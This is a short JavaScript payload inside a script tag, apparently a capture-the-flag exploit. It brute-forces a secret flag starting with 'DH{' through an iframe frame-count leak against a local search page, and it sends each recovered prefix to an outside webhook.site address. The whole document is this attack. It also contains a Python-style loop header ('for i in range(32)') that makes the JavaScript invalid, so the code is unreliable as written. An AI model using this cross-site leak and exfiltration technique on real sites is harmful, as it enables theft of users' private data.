<script>
async function leak() {
    const chars = "0123456789abcdef";
    let flag = "DH{";
    const webhook = "https://webhook.site/bb5035c7-26ff-4343-a7fb-1bcd6549ad8f";

    for i in range(32) {
        let foundChar = false;
        for (let char of chars) {
            const query = flag + char;
            const iframe = document.createElement("iframe");            

            iframe.src = `http://127.0.0.1:8000/search?query=${query}`;

            await new Promise((resolve) => {
                iframe.onload = () => {
                    if (iframe.contentWindow.frames.length > 0) {
                        flag += char;
                        foundChar = true;
                        fetch(`${webhook}?flag=${flag}`);
                    }
                    document.body.removeChild(iframe);
                    resolve();
                };
                document.body.appendChild(iframe);
            });
            if (foundChar) break;
        }
    }
}
leak();
</script>
